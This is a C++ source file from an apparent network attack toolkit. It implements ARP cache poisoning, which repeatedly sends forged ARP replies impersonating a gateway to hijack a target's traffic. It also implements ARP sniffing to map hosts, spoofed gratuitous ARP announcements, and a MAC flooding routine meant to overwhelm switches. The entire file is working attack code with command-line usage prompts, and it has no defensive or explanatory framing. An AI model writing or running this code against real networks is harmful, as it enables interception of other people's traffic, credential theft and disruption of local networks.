#include "layer2/arp.h"
#include "core/socket.h"
#include "core/utils.h"
#include <iostream>
#include <cstring>
#include <thread>
#include <chrono>
#include <arpa/inet.h>
#include <map>
#include <mutex>
namespace lemonade {
struct arp_packet {
    uint16_t htype, ptype; uint8_t hlen, plen; uint16_t op;
    uint8_t sender_mac[6]; uint32_t sender_ip;
    uint8_t target_mac[6]; uint32_t target_ip;
} __attribute__((packed));
void ARP::poison(const std::vector<std::string>& args) {
    if(args.size()<3){ std::cerr<<"Usage: -arppoison <target_ip> <gateway_ip> <interface>\n"; return; }
    std::string target_ip=args[0], gateway_ip=args[1], iface=args[2];
    RawSocket sock(iface);
    if(!sock.open()){ std::cerr<<"socket failed\n"; return; }
    uint8_t target_mac[6]={0xff,0xff,0xff,0xff,0xff,0xff};
    arp_packet pkt;
    pkt.htype=htons(1); pkt.ptype=htons(0x0800); pkt.hlen=6; pkt.plen=4; pkt.op=htons(2);
    memcpy(pkt.sender_mac, sock.get_mac(), 6);
    pkt.sender_ip=ip_to_int(gateway_ip);
    memcpy(pkt.target_mac, target_mac, 6);
    pkt.target_ip=ip_to_int(target_ip);
    std::vector<uint8_t> frame(14+sizeof(pkt));
    memcpy(frame.data(), target_mac,6);
    memcpy(frame.data()+6, sock.get_mac(),6);
    frame[12]=0x08; frame[13]=0x06;
    memcpy(frame.data()+14, &pkt, sizeof(pkt));
    std::cout<<"Poisoning "<<target_ip<<" -> "<<gateway_ip<<" on "<<iface<<"\n";
    while(true){ sock.send(frame); std::this_thread::sleep_for(std::chrono::seconds(2)); }
}
void ARP::passive_sniff(const std::vector<std::string>& args) {
    if(args.size()<1){ std::cerr<<"Usage: -arp sniff <interface>\n"; return; }
    std::string iface=args[0];
    RawSocket sock(iface);
    if(!sock.open()){ std::cerr<<"socket failed\n"; return; }
    std::map<uint32_t,std::string> ip_mac;
    std::cout<<"Sniffing ARP on "<<iface<<"\n";
    while(true){
        auto data=sock.receive(5000);
        if(data.empty()) continue;
        if(data.size()<14+sizeof(arp_packet)) continue;
        if(data[12]!=0x08 || data[13]!=0x06) continue;
        arp_packet* pkt=(arp_packet*)(data.data()+14);
        uint32_t ip=pkt->sender_ip;
        char mac[18];
        snprintf(mac,18,"%02x:%02x:%02x:%02x:%02x:%02x",pkt->sender_mac[0],pkt->sender_mac[1],pkt->sender_mac[2],pkt->sender_mac[3],pkt->sender_mac[4],pkt->sender_mac[5]);
        ip_mac[ip]=mac;
        std::cout<<int_to_ip(ip)<<" -> "<<mac<<"\n";
    }
}
void ARP::gratuitous(const std::vector<std::string>& args) {
    if(args.size()<2){ std::cerr<<"Usage: -arp gratuitous <target_ip> <interface>\n"; return; }
    std::string target_ip=args[0], iface=args[1];
    RawSocket sock(iface);
    if(!sock.open()){ std::cerr<<"socket failed\n"; return; }
    uint8_t broadcast[6]={0xff,0xff,0xff,0xff,0xff,0xff};
    arp_packet pkt;
    pkt.htype=htons(1); pkt.ptype=htons(0x0800); pkt.hlen=6; pkt.plen=4; pkt.op=htons(1);
    memcpy(pkt.sender_mac, sock.get_mac(), 6);
    pkt.sender_ip=ip_to_int(target_ip);
    memcpy(pkt.target_mac, broadcast, 6);
    pkt.target_ip=ip_to_int(target_ip);
    std::vector<uint8_t> frame(14+sizeof(pkt));
    memcpy(frame.data(), broadcast,6);
    memcpy(frame.data()+6, sock.get_mac(),6);
    frame[12]=0x08; frame[13]=0x06;
    memcpy(frame.data()+14, &pkt, sizeof(pkt));
    sock.send(frame);
    std::cout<<"Gratuitous ARP sent for "<<target_ip<<"\n";
}
void ARP::flood(const std::vector<std::string>& args) {
    if(args.size()<2){ std::cerr<<"Usage: -macflood <interface> <duration_sec>\n"; return; }
    std::string iface=args[0];
    int duration=std::stoi(args[1]);
    RawSocket sock(iface);
    if(!sock.open()){ std::cerr<<"socket failed\n"; return; }
    auto start=std::chrono::steady_clock::now();
    uint8_t rand_mac[6];
    uint8_t broadcast[6]={0xff,0xff,0xff,0xff,0xff,0xff};
    while(std::chrono::duration_cast<std::chrono::seconds>(std::chrono::steady_clock::now()-start).count()<duration){
        for(int i=0;i<6;i++) rand_mac[i]=rand()%256;
        std::vector<uint8_t> frame(14);
        memcpy(frame.data(), broadcast,6);
        memcpy(frame.data()+6, rand_mac,6);
        frame[12]=0x08; frame[13]=0x00;
        sock.send(frame);
        std::this_thread::sleep_for(std::chrono::microseconds(100));
    }
    std::cout<<"MAC flood finished\n";
}
}
